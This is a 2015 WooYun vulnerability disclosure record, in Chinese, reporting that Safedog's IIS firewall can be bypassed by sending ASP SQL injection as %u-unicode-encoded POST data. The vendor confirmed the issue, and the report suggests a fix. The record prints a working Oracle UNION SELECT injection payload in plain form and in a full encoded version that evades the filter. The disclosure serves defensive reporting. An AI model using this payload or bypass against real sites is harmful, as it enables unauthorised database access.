{"id": 72157, "wybug_id": "wooyun-2015-0151853", "wybug_title": "安全狗IIS版本asp注入防护拦截bypass", "wybug_corp": "安全狗", "wybug_author": "進撃のDanny", "wybug_date": "2015-11-05 17:10", "wybug_open_date": "2015-12-20 17:24", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向公众公开  简要描述： 安全狗IIS版本asp注入防护拦截bypass，最新版测试通过。 详细说明：  我们知道asp有两个特性1，会将Request中的不能编码部分的%去掉2，Request中如果有unicode部分会将其进行解码安全狗在处理特性2的时候只是做了GET方式的解码，POST方式并没有所有我们在进行POST注入的时候只需要将其编码为unicode即可绕过安全狗的拦截。   漏洞证明：  下面我们来测试下。主程序和规则文件都是最新的\n\n没有进行unicode编码时拦截了\nQ=1' UNION ALL SELECT NULL,NULL,NULL,NULL,CHR(113)||CHR(107)||CHR(112)||CHR(106)||CHR(113)||NVL(CAST(OWNER AS VARCHAR(4000)),CHR(32))||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113) FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)--\n\n\n编码后 绕过了链接\nQ=%u0031%u0027%u0020%u0055%u004E%u0049%u004F%u004E%u0020%u0041%u004C%u004C%u0020%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0030%u0037%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0032%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0030%u0036%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u007C%u007C%u004E%u0056%u004C%u0028%u0043%u0041%u0053%u0054%u0028%u004F%u0057%u004E%u0045%u0052%u0020%u0041%u0053%u0020%u0056%u0041%u0052%u0043%u0048%u0041%u0052%u0028%u0034%u0030%u0030%u0030%u0029%u0029%u002C%u0043%u0048%u0052%u0028%u0033%u0032%u0029%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0032%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0038%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0032%u0029%u007C%u007C%u0043%u0048%u0052%u0028%u0031%u0031%u0033%u0029%u0020%u0046%u0052%u004F%u004D%u0020%u0028%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0044%u0049%u0053%u0054%u0049%u004E%u0043%u0054%u0028%u004F%u0057%u004E%u0045%u0052%u0029%u0020%u0046%u0052%u004F%u004D%u0020%u0053%u0059%u0053%u002E%u0041%u004C%u004C%u005F%u0054%u0041%u0042%u004C%u0045%u0053%u0029%u002D%u002D%u0020\n\n\n线上案例我就不找了啊，只要ASP 的网站存在POST方式注入都可以绕过。   修复方案：  POST时先unicode解码，再过正则   版权声明：转载请注明来源 進撃のDanny@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-11-05 17:23 厂商回复： 我猜是同一个人吧，实在是太感谢你了！！！！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}